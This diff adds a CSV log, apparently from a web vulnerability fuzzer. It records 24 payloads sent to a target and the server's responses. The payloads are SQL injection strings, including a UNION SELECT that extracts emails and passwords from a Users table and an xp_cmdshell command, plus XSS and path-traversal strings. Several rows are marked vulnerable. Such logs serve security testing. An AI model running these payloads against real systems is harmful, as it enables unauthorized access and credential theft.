@@ -1,0 +1,25 @@
+ID,Payload,HTTP Status,Reason,Response Size,RTT (ms),Reflected,Fuzzer State
+1,',500,"<urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά>",0,4120,NO,Server Error
+2,'',500,"<urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά>",0,4096,NO,Server Error
+3,`,500,"<urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά>",0,4082,NO,Server Error
+4,``,500,"<urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά>",0,4092,NO,Server Error
+5,",",500,"<urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά>",0,4103,NO,Server Error
+6,"""",500,"<urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά>",0,4097,NO,Server Error
+7,"""""",500,"<urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά>",0,4103,NO,Server Error
+8,' OR '1'='1,500,"<urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά>",0,4078,NO,Server Error
+9,' OR '1'='1' --,500,"<urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά>",0,4085,NO,Server Error
+10,' OR '1'='1' /*,500,"<urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά>",0,4089,NO,Server Error
+11,admin' --,500,[WinError 10054] Μια υπάρχουσα σύνδεση διακόπηκε υποχρεωτικά από τον απομακρυσμένο υπολογιστή,0,5006,NO,Server Error
+12,')) OR 1=1--,200,OK,34158,5045,NO,Found (Records Returned)
+13,"')) UNION SELECT 1,2,3,4,5,6,7,8,9--",500,Internal Server Error,497,5013,YES,Vulnerable (SQL Syntax Error)
+14,"')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--",500,Internal Server Error,583,5036,YES,Vulnerable (SQL Syntax Error)
+15,1' ORDER BY 1--+,500,Internal Server Error,345,5016,YES,Vulnerable (SQL Syntax Error)
+16,1' ORDER BY 10--+,500,Internal Server Error,347,5021,YES,Vulnerable (SQL Syntax Error)
+17,"1' UNION SELECT null, table_name FROM information_schema.tables--",500,Internal Server Error,443,5010,YES,Vulnerable (SQL Syntax Error)
+18,'; EXEC xp_cmdshell('dir')--,500,Internal Server Error,361,5029,YES,Vulnerable (SQL Syntax Error)
+19,"' AND 1=0 UNION SELECT 1, 'admin', 'pass', 4, 5, 6, 7, 8, 9--",500,Internal Server Error,435,5014,YES,Vulnerable (SQL Syntax Error)
+20,<script>alert('XSS')</script>,500,Internal Server Error,367,5027,YES,Vulnerable (SQL Syntax Error)
+21,"<iframe src=""javascript:alert(1)"">",200,OK,30,5011,NO,OK
+22,../../../../etc/passwd,200,OK,30,5031,NO,OK
+23,..\..\..\windows\win.ini,200,OK,30,5018,NO,OK
+24,test_benign_query,200,OK,30,5035,NO,OK
